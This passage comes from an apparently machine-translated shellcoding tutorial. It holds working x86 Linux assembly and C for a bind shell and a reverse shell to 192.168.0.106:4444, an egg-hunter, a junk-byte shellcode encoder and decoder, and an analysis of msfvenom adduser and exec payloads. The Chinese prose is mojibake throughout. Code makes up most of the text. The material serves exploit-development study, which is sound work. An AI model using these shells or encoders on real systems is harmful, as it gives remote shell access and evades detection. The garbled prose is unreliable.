	; calling socketcall<font></font>
	mov al, 102<font></font>
	mov bl, 4		; listen()<font></font>
	mov ecx, esp<font></font>
	int 0x80</code></pre><br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.å‘¼å«æ¥å—ï¼ˆï¼‰</font></font></b><br>
<br>
<pre><code class="plaintext hljs">	; creating accept()<font></font>
	push esi<font></font>
	push esi<font></font>
	push edx<font></font>
	; calling socketcall<font></font>
	mov al, 102<font></font>
	mov bl, 5		; accept()<font></font>
	mov ecx, esp<font></font>
	int 0x80<font></font>
<font></font>
	mov edx, eax		; saving client file descriptor</code></pre><br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.å¤åˆ¶æ ‡å‡†æè¿°ç¬¦ã€‚</font></font></b><br>
<br>
<pre><code class="plaintext hljs">	; dup2 STDIN, STDOUT, STDERR<font></font>
	xor ecx, ecx<font></font>
	mov cl, 3<font></font>
	mov ebx, edx<font></font>
dup:	dec ecx<font></font>
	mov al, 63<font></font>
	int 0x80<font></font>
	jns dup</code></pre><br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.è°ƒç”¨å‘½ä»¤å¤–å£³</font></font></b><br>
<br>
<pre><code class="plaintext hljs">	; execve /bin/sh<font></font>
	xor eax, eax<font></font>
	push eax<font></font>
	push 0x68732f2f<font></font>
	push 0x6e69622f<font></font>
        mov ebx, esp<font></font>
        push eax<font></font>
        mov edx, esp<font></font>
        push ebx<font></font>
        mov ecx, esp<font></font>
        mov al, 11<font></font>
        int 0x80</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ç°åœ¨æ”¾åœ¨ä¸€èµ·</font></font><br>
<br>
<pre><code class="plaintext hljs">	section .text<font></font>
global _start<font></font>
<font></font>
_start:<font></font>
	; clear registers<font></font>
	xor eax, eax<font></font>
	xor ebx, ebx<font></font>
	xor esi, esi<font></font>
	; creating socket. 3 args<font></font>
	push esi	; 3rd arg, choose default proto<font></font>
	push 0x1	; 2nd arg, 1 equal SOCK_STREAM, TCP<font></font>
	push 0x2	; 1st arg, 2 means Internet family proto<font></font>
	; calling socket call for socket creating<font></font>
	mov al, 102	; socketcall<font></font>
	mov bl, 1	; 1 = socket()<font></font>
	mov ecx, esp	; pointer to args of socket()<font></font>
	int 0x80<font></font>
	; in eax socket file descriptor. Save it<font></font>
	mov edx, eax<font></font>
<font></font>
	; creating sockaddr_in addr struct for bind<font></font>
	push esi		; address, 0 - all interfaces<font></font>
	push WORD 0xd204	; port 1234.<font></font>
	push WORD 2		; AF_INET<font></font>
	mov ecx, esp		; pointer to sockaddr_in struct<font></font>
	push 0x16		; size of struct<font></font>
	push ecx		; pushing pointer to struct<font></font>
	push edx		; pushing socket descriptor<font></font>
	; socketcall<font></font>
	mov al, 102		; socketcall() number<font></font>
	mov bl, 2		; bind()<font></font>
	mov ecx, esp		; 2nd argument - pointer to args<font></font>
	int 0x80<font></font>
<font></font>
	; creating listen<font></font>
	push 1			; listen for 1 client<font></font>
	push edx		; clients queue size<font></font>
	; calling socketcall<font></font>
	mov al, 102<font></font>
	mov bl, 4		; listen()<font></font>
	mov ecx, esp<font></font>
	int 0x80<font></font>
<font></font>
	; creating accept()<font></font>
	push esi		; use default value<font></font>
	push esi		; use default value<font></font>
	push edx		; sockfd<font></font>
	; calling socketcall<font></font>
	mov al, 102<font></font>
	mov bl, 5		; accept()<font></font>
	mov ecx, esp<font></font>
	int 0x80<font></font>
<font></font>
	mov edx, eax		; saving client file descriptor<font></font>
<font></font>
	; dup2 STDIN, STDOUT, STDERR<font></font>
	xor ecx, ecx		; clear ecx<font></font>
	mov cl, 3		; number of loops<font></font>
	mov ebx, edx		; socketfd<font></font>
dup:	dec ecx<font></font>
	mov al, 63		; number of dup2 syscall()<font></font>
	int 0x80<font></font>
	jns dup			; repeat for 1,0<font></font>
<font></font>
	; execve /bin/bash<font></font>
	xor eax, eax		; clear eax<font></font>
	push eax		; string terminator<font></font>
	push 0x68732f2f		; //bin/sh<font></font>
	push 0x6e69622f<font></font>
        mov ebx, esp		; 1st arg - address of //bin/sh<font></font>
        push eax		; <font></font>
        mov edx, eax		; last argument is zero<font></font>
        push ebx		; 2nd arg - pointer to all args of command<font></font>
        mov ecx, esp		; pointer to args<font></font>
        mov al, 11		; execve syscall number<font></font>
        int 0x80</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ç°åœ¨ï¼Œæˆ‘ä»¬ä½¿ç”¨æ¥æ”¶åˆ°çš„shellcodeçš„æ“ä½œç ï¼Œå°†å…¶ä¼ è¾“åˆ°æˆ‘ä»¬çš„Cæ–‡ä»¶æ¨¡æ¿ï¼Œè¿›è¡Œç¼–è¯‘å¹¶è¿è¡Œï¼š</font></font><br>
<br>
<img src="https://habrastorage.org/webt/px/vs/x_/pxvsx_kbwk8cpw6ut9vd0eopjt0.png" alt="å›¾ç‰‡"><br>
<br>
<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.åå‘TCP Shell</font></font></h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
è¯¥ä»»åŠ¡çš„å®ç°ä¸ä¸Šä¸€ä¸ªä»»åŠ¡éå¸¸ç›¸ä¼¼ï¼Œä¸åŒä¹‹å¤„åœ¨äºæˆ‘ä»¬å°†æ¥å—ä¼ å…¥è¿æ¥ã€‚</font><font style="vertical-align: inherit;">é€šç”¨ç®—æ³•ï¼š</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
1.åˆ›å»ºä¸€ä¸ªå¥—æ¥å­—ï¼›</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
2.è®¾ç½®è¿æ¥å‚æ•°ï¼šåè®®ï¼Œä¸»æœºï¼Œç«¯å£ï¼›</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
3.é‡å¤çš„æ–‡ä»¶æè¿°ç¬¦ï¼›</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
4.è°ƒç”¨å‘½ä»¤å¤–å£³ã€‚</font></font><br>
<br>
<pre><code class="cpp hljs"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/socket.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;netinet/ip.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;arpa/inet.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><font></font>
<font></font>
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span> <span class="hljs-params">()</span>
</span>{
    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* ip = <span class="hljs-string">"192.168.0.106"</span>;	<span class="hljs-comment">// place your address here</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">addr</span>;</span><font></font>
<font></font>
    addr.sin_family = AF_INET;<font></font>
    addr.sin_port = htons(<span class="hljs-number">4444</span>);	<span class="hljs-comment">// port</span><font></font>
    inet_aton(ip, &amp;addr;.sin_addr);<font></font>
<font></font>
    <span class="hljs-keyword">int</span> sockfd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<font></font>
    connect(sockfd, (struct sockaddr *)&amp;addr;, <span class="hljs-keyword">sizeof</span>(addr));<font></font>
<font></font>
    <span class="hljs-comment">/* duplicating standard file descriptors */</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++)<font></font>
    {<font></font>
        dup2(sockfd, i);<font></font>
    }<font></font>
<font></font>
    execve(<span class="hljs-string">"/bin/sh"</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<font></font>
<font></font>
 </code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
æˆ‘ä»¬ç¿»è¯‘æˆæ±‡ç¼–å™¨</font></font><br>
<br>
<pre><code class="plaintext hljs">	section .text<font></font>
global _start<font></font>
<font></font>
_start:<font></font>
	; creating socket<font></font>
	xor eax, eax<font></font>
	xor esi, esi<font></font>
	xor ebx, ebx<font></font>
	push esi<font></font>
	push 0x1<font></font>
	push 0x2<font></font>
	; calling socket call for socket creating<font></font>
	mov al, 102<font></font>
	mov bl, 1<font></font>
	mov ecx, esp<font></font>
	int 0x80<font></font>
	mov edx, eax<font></font>
<font></font>
	; creating sockaddr_in and connect()<font></font>
	push esi<font></font>
	push esi<font></font>
	push 0x6a00a8c0		; IPv4 address to connect<font></font>
	push WORD 0x5c11	; port<font></font>
	push WORD 2<font></font>
	mov ecx, esp<font></font>
	push 0x16<font></font>
	push ecx<font></font>
	push edx<font></font>
	; socketcall()<font></font>
	mov al, 102<font></font>
	mov bl, 3		; connect()<font></font>
	mov ecx, esp<font></font>
	int 0x80<font></font>
<font></font>
	; dup2 STDIN, STDOUT, STDERR<font></font>
	xor ecx, ecx<font></font>
	mov cl, 3<font></font>
	mov ebx, edx<font></font>
dup:	dec ecx<font></font>
	mov al, 63<font></font>
	int 0x80<font></font>
	jns dup<font></font>
<font></font>
	; execve /bin/sh<font></font>
	xor eax, eax<font></font>
	push eax<font></font>
	push 0x68732f2f<font></font>
	push 0x6e69622f<font></font>
        mov ebx, esp<font></font>
        push eax<font></font>
        mov edx, esp<font></font>
        push ebx<font></font>
        mov ecx, esp<font></font>
        mov al, 11<font></font>
        int 0x80</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ç„¶åï¼š</font></font><br>
<br>
<pre><code class="plaintext hljs">$nasm32 reverse_tcp_shell</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
æ‚¨å¯ä»¥ä½¿ç”¨ç±»ä¼¼çš„å‘½ä»¤æ¥æ›´æ”¹è¿æ¥åœ°å€æˆ–ç«¯å£ï¼ˆä»»åŠ¡1ï¼‰</font></font><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ç»“æœ</font></font></i><br>
<br>
<img src="https://habrastorage.org/webt/cv/dg/cs/cvdgcsad2nttszw7x56-iqnygwy.png" alt="å›¾ç‰‡"><br>
<br>
<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.å¯»è›‹æŠ€æœ¯</font></font></h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
å¯»è›‹æŠ€æœ¯æ˜¯åœ¨å†…å­˜ä¸­æ‰¾åˆ°â€œå¤æ´»èŠ‚å½©è›‹â€æŒ‡å®šçš„åŒºåŸŸï¼ˆæˆ‘ä»¬äº‹å…ˆçŸ¥é“å…¶å«ä¹‰ï¼‰ï¼Œå¹¶å°†æ§åˆ¶æƒè½¬ç§»åˆ°â€œé¸¡è›‹â€ä¹‹åçš„ä»£ç ä¸­ã€‚</font><font style="vertical-align: inherit;">å½“æˆ‘ä»¬ä¸çŸ¥é“shellcodeçš„ç¡®åˆ‡ä½ç½®åœ°å€æ—¶ï¼Œæ­¤æŠ€æœ¯å¾ˆæœ‰ç”¨ã€‚</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ä¸ºäº†è¯´æ˜è¿™ä¸ªä¾‹å­ï¼š</font></font><br>
<br>
<ol>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">æˆ‘ä»¬å°†â€œåƒåœ¾â€æ”¾åœ¨å †æ ˆä¸Šï¼›</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">å°†æˆ‘ä»¬çš„shellcodeæ”¾åœ¨å †æ ˆä¸Šï¼›</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">å°†å¤æ´»èŠ‚å½©è›‹æ”¾åœ¨æ¶å­ä¸Šï¼›</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">æ·»åŠ æ›´å¤šåƒåœ¾ã€‚</font></font></li>
</ol><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
è¦ç”Ÿæˆâ€œåƒåœ¾â€ï¼Œæˆ‘ä»¬ä½¿ç”¨ä»¥ä¸‹è„šæœ¬ï¼š</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/python3</span><font></font>
<font></font>
<span class="hljs-keyword">import</span> random<font></font>
<font></font>
rdm = bytearray(random.getrandbits(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(<span class="hljs-number">96</span>))
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,len(rdm),<span class="hljs-number">4</span>):<font></font>
	bts = rdm[i:i+<span class="hljs-number">4</span>]<font></font>
	print(<span class="hljs-string">"\tpush 0x"</span> + <span class="hljs-string">''</span>.join(<span class="hljs-string">'{:02x}'</span>.format(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> bts))</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
æˆ‘ä»¬å°†æœç´¢shellcodeï¼š</font></font><br>
<br>
<pre><code class="plaintext hljs">	; execve_sh<font></font>
global _start<font></font>
<font></font>
section .text<font></font>
_start:<font></font>
<font></font>
        ; PUSH 0<font></font>
        xor eax, eax<font></font>
        push eax<font></font>
<font></font>
        ; PUSH //bin/sh (8 bytes)<font></font>
	push 0x68732f2f<font></font>
	push 0x6e69622f<font></font>
<font></font>
        mov ebx, esp<font></font>
<font></font>
        push eax<font></font>
        mov edx, eax<font></font>
<font></font>
        push ebx<font></font>
        mov ecx, esp<font></font>
<font></font>
        mov al, 11<font></font>
        int 0x80</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
æ­¤shellcodeå¿…é¡»è¿›è¡Œç¼–è¯‘ï¼Œè·å–å…¶opcodeå¹¶æ”¾å…¥å †æ ˆã€‚</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ç»“æœï¼Œæˆ‘ä»¬å°†æˆåŠŸï¼š</font></font><br>
<br>
<pre><code class="plaintext hljs">section .text<font></font>
global _start<font></font>
<font></font>
_start:<font></font>
	; trash<font></font>
	push 0x94047484<font></font>
	push 0x8c35f24a<font></font>
	push 0x5a449067<font></font>
	push 0xf5a651ed<font></font>
	push 0x7161d058<font></font>
	push 0x3b7b4e10<font></font>
	push 0x9f93c06e<font></font>
	; shellcode execve() /bin/sh<font></font>
	push 0x9080cd0b<font></font>
	push 0xb0e18953<font></font>
	push 0xe28950e3<font></font>
	push 0x896e6962<font></font>
	push 0x2f687361<font></font>
	push 0x622f6868<font></font>
	push 0x6a50c031<font></font>
	; egg<font></font>
	push 0xdeadbeef<font></font>
	; trash<font></font>
        push 0xd213a92d<font></font>
        push 0x9e3a066b<font></font>
        push 0xeb8cb927<font></font>
        push 0xddbaec55<font></font>
        push 0x43a73283<font></font>
        push 0x89f447de<font></font>
        push 0xacfb220f<font></font>
<font></font>
<font></font>
	mov ebx, 0xefbeadde	; egg in reverse order<font></font>
        mov esi, esp<font></font>
        mov cl, 200		; change this value for deeper or less searching<font></font>
<font></font>
find:   lodsb			; read byte from source - esi<font></font>
        cmp eax, ebx		; is it egg?<font></font>
        jz equal		; if so, give control to shellcode<font></font>
	shl eax, 8		; if not, shift one byte left<font></font>
        loop find		; repeat<font></font>
<font></font>
	xor eax, eax		; if there is no egg - exit<font></font>
        mov al, 1<font></font>
	xor ebx, ebx<font></font>
        mov bl, 10<font></font>
        int 0x80<font></font>
<font></font>
equal: jmp esi			; jmp to shellcode</code></pre><br>
<img src="https://habrastorage.org/webt/yg/yd/gt/ygydgt0qxjwf1ev2_4e0i6puwek.png" alt="å›¾ç‰‡"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
æ‚¨å¯ä»¥ä½¿ç”¨jmp findè¯­å¥æ›¿æ¢å¾ªç¯æŸ¥æ‰¾ï¼Œä½†è¿™å¯èƒ½å¯¼è‡´ç¨‹åºé”™è¯¯ã€‚</font><font style="vertical-align: inherit;">æ‚¨ä¹Ÿå¯ä»¥ä¸ºè¯¥å¼‚å¸¸åˆ›å»ºå¤„ç†ç¨‹åºï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬çš„ä»£ç å°±è¶³å¤Ÿäº†ã€‚</font><font style="vertical-align: inherit;">æœ‰æ—¶å¯èƒ½æœ‰å¿…è¦æ‰¾åˆ°ä¸€ä¸ªä½äºä¸åŒå†…å­˜æ–¹å‘ä¸Šçš„â€œå¤æ´»èŠ‚å½©è›‹â€ï¼Œç„¶åéœ€è¦æ›´æ”¹directionæ ‡å¿—çš„å€¼ï¼Œç„¶åå¯ä»¥ä½¿ç”¨jmp esi + offsetå°†æ§åˆ¶æƒè½¬ç§»åˆ°shellcodeã€‚</font></font><br>
<br>
<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.ç¼–å†™ç¼–ç å™¨</font></font></h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
åœ¨æˆ‘ä»¬çš„æƒ…å†µä¸‹ï¼Œç¼–ç åœ¨äºä¿®æ”¹shellcodeçš„æºä»£ç ï¼Œè€Œä¸ä½¿ç”¨åå‘è§£ç æ‰€éœ€çš„ä¿¡æ¯ï¼Œè¿™ä½¿è¯¥è¿‡ç¨‹ä¸åŠ å¯†è¿‡ç¨‹æœ‰æ‰€åŒºåˆ«ã€‚</font><font style="vertical-align: inherit;">æ®æˆ‘æ‰€çŸ¥ï¼Œæˆ‘å†³å®šå®Œæˆæ­¤ä»»åŠ¡ï¼Œä½†æœ‰ä¸€ç‚¹å¤æ‚ï¼šåœ¨shellcodeçš„æ‰€éœ€å­—èŠ‚ä¹‹é—´ï¼Œæœ‰ä¸€ä¸ªéšæœºçš„ï¼ˆä»1åˆ°5ï¼‰å­—èŠ‚çš„åƒåœ¾å­—èŠ‚ã€‚</font><font style="vertical-align: inherit;">ä¸ºäº†ç”Ÿæˆç¼–ç çš„shellcodeï¼Œæˆ‘ç¼–å†™äº†ä»¥ä¸‹è„šæœ¬ï¼š</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/python3</span>
<span class="hljs-comment"># -*- coding: utf-8 -*-</span><font></font>
<font></font>
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> random<font></font>
<font></font>
<span class="hljs-keyword">if</span> len(sys.argv) != <span class="hljs-number">2</span>:<font></font>
        print(<span class="hljs-string">"Enter opcode in hex"</span>)<font></font>
        sys.exit(<span class="hljs-number">0</span>)<font></font>
<font></font>
opcode = sys.argv[<span class="hljs-number">1</span>]<font></font>
encoded = <span class="hljs-string">""</span><font></font>
<font></font>
b1 = bytearray.fromhex(opcode)<font></font>
<font></font>
<span class="hljs-comment"># Generates random value from 1 to 5 of 'aa' string</span>
<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> b1:<font></font>
        t = <span class="hljs-string">'aa'</span> * random.randint(<span class="hljs-number">1</span>,<span class="hljs-number">5</span>)<font></font>
        encoded += <span class="hljs-string">'%02x'</span> % x + t<font></font>
<font></font>
print(encoded)</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ç»“æœè¢«å‹å…¥å †æ ˆï¼š</font></font><br>
<br>
<pre><code class="plaintext hljs">$./hex2stack.py $(./encoder.py $(hexopcode execve_sh))</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ç»“è®ºï¼š</font></font><br>
<br>
<pre><code class="plaintext hljs">	push 0x909090aa<font></font>
	push 0xaaaaaaaa<font></font>
	push 0x80aaaaaa<font></font>
	push 0xaacdaaaa<font></font>
	push 0xaaaa0baa<font></font>
	push 0xaaaaaaaa<font></font>
	push 0xb0aaaaaa<font></font>
	push 0xaae1aaaa<font></font>
	push 0xaaaaaa89<font></font>
	push 0xaaaaaa53<font></font>
	push 0xaaaaaac2<font></font>
	push 0xaa89aaaa<font></font>
	push 0xaaaa50aa<font></font>
	push 0xaaaaaaaa<font></font>
	push 0xe3aaaa89<font></font>
	push 0xaaaa6eaa<font></font>
	push 0xaa69aaaa<font></font>
	push 0xaaaa62aa<font></font>
	push 0xaaaaaa2f<font></font>
	push 0xaa68aaaa<font></font>
	push 0x68aaaaaa<font></font>
	push 0xaaaa73aa<font></font>
	push 0xaaaa2faa<font></font>
	push 0xaa2faaaa<font></font>
	push 0xaa68aaaa<font></font>
	push 0x50aaaaaa<font></font>
	push 0xaaaac0aa<font></font>
	push 0xaaaaaa31</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
æ³¨æ„ç¬¬ä¸€éƒ¨åˆ†0x909090aaã€‚</font><font style="vertical-align: inherit;">å³è¾¹çš„ç¬¬ä¸€ä¸ªå­—èŠ‚90æ˜¯æˆ‘ä»¬ç¼–ç çš„shellcodeçš„ç»“å°¾ã€‚</font><font style="vertical-align: inherit;">å½“ç„¶ï¼Œæ‚¨å¯ä»¥é€‰æ‹©ä»»ä½•å…¶ä»–æœ‰æ•ˆå€¼æ¥æŒ‡ç¤ºshellcodeçš„ç»“å°¾ã€‚</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
è§£ç å™¨ä»£ç ï¼š</font></font><br>
<br>
<pre><code class="plaintext hljs">	section .text<font></font>
	global _start<font></font>
_start:<font></font>
	; encoded shellcode<font></font>
	push 0x909090aa<font></font>
	push 0xaaaaaaaa<font></font>
	push 0x80aaaaaa<font></font>
	push 0xaacdaaaa<font></font>
	push 0xaaaa0baa<font></font>
	push 0xaaaaaaaa<font></font>
	push 0xb0aaaaaa<font></font>
	push 0xaae1aaaa<font></font>
	push 0xaaaaaa89<font></font>
	push 0xaaaaaa53<font></font>
	push 0xaaaaaac2<font></font>
	push 0xaa89aaaa<font></font>
	push 0xaaaa50aa<font></font>
	push 0xaaaaaaaa<font></font>
	push 0xe3aaaa89<font></font>
	push 0xaaaa6eaa<font></font>
	push 0xaa69aaaa<font></font>
	push 0xaaaa62aa<font></font>
	push 0xaaaaaa2f<font></font>
	push 0xaa68aaaa<font></font>
	push 0x68aaaaaa<font></font>
	push 0xaaaa73aa<font></font>
	push 0xaaaa2faa<font></font>
	push 0xaa2faaaa<font></font>
	push 0xaa68aaaa<font></font>
	push 0x50aaaaaa<font></font>
	push 0xaaaac0aa<font></font>
	push 0xaaaaaa31<font></font>
<font></font>
	; prepare registers for decoding<font></font>
	mov esi, esp<font></font>
	mov edi, esp<font></font>
	mov bl, 0xaa<font></font>
<font></font>
decoder:<font></font>
	lodsb		; read byte from stack<font></font>
	cmp al, bl	; check: is it trash byte?<font></font>
	jz loopy	; if so, repeat<font></font>
	cmp al, 0x90	; is it end of shellcode?<font></font>
	jz exec		; if so, go to start of shellcode<font></font>
	stosb		; if not, place byte of shellcode into stack<font></font>
loopy:	jmp decoder	; repeat<font></font>
<font></font>
exec:	jmp esp		; give flow control to shellcode</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
å¦‚æœshellcodeæ²¡æœ‰nopæŒ‡ä»¤ï¼ˆ0x90ï¼‰ï¼Œåˆ™å¯ä»¥é€‰æ‹©æ­¤å­—èŠ‚ä½œä¸ºshellcodeç»“æŸçš„æ ‡è®°ã€‚</font><font style="vertical-align: inherit;">åœ¨å…¶ä»–æƒ…å†µä¸‹ï¼Œæ‚¨å¿…é¡»ä½¿ç”¨å…¶ä»–å€¼ã€‚</font></font><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ç»“æœï¼š</font></font></i><br>
<br>
<img src="https://habrastorage.org/webt/yv/ti/4u/yvti4u7yj5dkmpbb2n7qdlzkrfq.png" alt="å›¾ç‰‡"><br>
<br>
<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.ä½¿ç”¨GDB / libemu / ndisasmåˆ†æmsfvenomç”Ÿæˆçš„shellcode</font></font></h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†åˆ†æç”±è‘—åå·¥å…·msfvenomè·å¾—çš„shellcodeã€‚</font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.æ·»åŠ ç”¨æˆ·</font></font></b><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
ç”Ÿæˆshellcodeçš„å‘½ä»¤ï¼š</font></font><br>
<br>
<pre><code class="plaintext hljs">msfvenom -a x86 --platform linux -p linux/x86/adduser -f c &gt; adduser.c
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
æœ‰å‡ ç§æ–¹æ³•å¯ä»¥åˆ†æç”Ÿæˆçš„GDB shellcodeï¼Œæˆ‘å†³å®šä½¿ç”¨ä¸€ç§æ–¹ä¾¿çš„æ–¹æ³•-å°†ä»£ç æ”¾åœ¨å †æ ˆä¸Šå¹¶å¯¹å…¶è¿›è¡Œåˆ†æã€‚</font></font><br>
<br>
<pre><code class="plaintext hljs">$ cat adduser.c | grep -Po "\\\x.." | tr -d '\n' | sed -e 's!\\x!!g' ; echo<font></font>
31c989cb6a4658cd806a055831c9516873737764682f2f7061682f65746389e341b504cd8093e8280000006d65746173706c6f69743a417a2f6449736a3470344952633a303a303a3a2f3a2f62696e2f73680a598b51fc6a0458cd806a0158cd80</code></pre><br>
<pre><code class="plaintext hljs">$ python3 hex2stack.py 31c989cb6a4658cd806a055831c9516873737764682f2f7061682f65746389e341b504cd8093e8280000006d65746173706c6f69743a417a2f6449736a3470344952633a303a303a3a2f3a2f62696e2f73680a598b51fc6a0458cd806a0158cd80<font></font>
out:<font></font>
	push 0x90909080<font></font>
	push 0xcd58016a<font></font>
	push 0x80cd5804<font></font>
	...</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
æˆ‘ä»¬å°†åˆ†æä»¥ä¸‹æ–‡ä»¶ï¼š</font></font><br>
<br>
<pre><code class="plaintext hljs">	section .text<font></font>
	global _start<font></font>
_start:<font></font>
	push 0x90909080<font></font>
	push 0xcd58016a<font></font>
	push 0x80cd5804<font></font>
	push 0x6afc518b<font></font>
	push 0x590a6873<font></font>
	push 0x2f6e6962<font></font>
	push 0x2f3a2f3a<font></font>
	push 0x3a303a30<font></font>
	push 0x3a635249<font></font>
	push 0x3470346a<font></font>
	push 0x7349642f<font></font>
	push 0x7a413a74<font></font>
	push 0x696f6c70<font></font>
	push 0x73617465<font></font>
	push 0x6d000000<font></font>
	push 0x28e89380<font></font>
	push 0xcd04b541<font></font>
	push 0xe3896374<font></font>
	push 0x652f6861<font></font>
	push 0x702f2f68<font></font>
	push 0x64777373<font></font>
	push 0x6851c931<font></font>
	push 0x58056a80<font></font>
	push 0xcd58466a<font></font>
	push 0xcb89c931<font></font>
	jmp esp</code></pre><br>
<img src="https://habrastorage.org/webt/m2/ha/gd/m2hagdg75saw6og2p27eu-xa3dm.png" alt="å›¾ç‰‡"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
shellcodeè¦åšçš„ç¬¬ä¸€ä»¶äº‹æ˜¯ä½¿ç”¨å‚æ•°ï¼ˆ0,0ï¼‰è®¾ç½®setreuidï¼ˆï¼‰ï¼šshellcodeå¿…é¡»å…·æœ‰rootç‰¹æƒã€‚</font><font style="vertical-align: inherit;">ä¹‹åï¼Œæ–‡ä»¶/ etc / passwdæ‰“å¼€ã€‚</font><font style="vertical-align: inherit;">åœ¨ä»£ç ä¸­ï¼Œæ‰“å¼€æ–‡ä»¶åï¼Œå°†ä½¿ç”¨è°ƒç”¨æŒ‡ä»¤ã€‚</font><font style="vertical-align: inherit;">æŒ‰ç…§æ­¤æŒ‡ä»¤ï¼Œå¤„ç†å™¨å°†æŠŠä¸‹ä¸€ä¸ªå‘½ä»¤æ”¾åœ¨å †æ ˆä¸­ã€‚</font><font style="vertical-align: inherit;">åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œè¿™æ ·çš„å‘½ä»¤åé¢æ˜¯å¸¦æœ‰æˆ‘ä»¬çš„ç”¨æˆ·å‚æ•°çš„è¡Œ-éšåï¼Œè¯¥è¡Œå°†è¢«å†™å…¥æ–‡ä»¶ã€‚</font><font style="vertical-align: inherit;">æ­¤æ–¹æ³•ä½¿æ‚¨å¯ä»¥ä½¿ç”¨ä»»ä½•æ•°æ®æ¥å†™å…¥æ–‡ä»¶ã€‚</font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. EXEC WHOAMIæˆ‘ä»¬</font></font></b><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
æƒ³å‡ºå†™å…¥æ–‡ä»¶ï¼Œç°åœ¨è®©æˆ‘ä»¬æ¥çœ‹çœ‹å¦‚ä½•å¯¹å‘½ä»¤çš„æ‰§è¡Œæ¥å®ç°ã€‚</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ç”Ÿæˆçš„shellcodeï¼š</font></font><br>
<br>
<pre><code class="plaintext hljs">msfvenom -a x86 --platform linux -p linux/x86/exec CMD="whoami" -f raw&gt; exec_whoami.bin</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
è¦åˆ†æä»£ç ï¼Œè¯·æ‰§è¡Œï¼š</font></font><br>
<br>
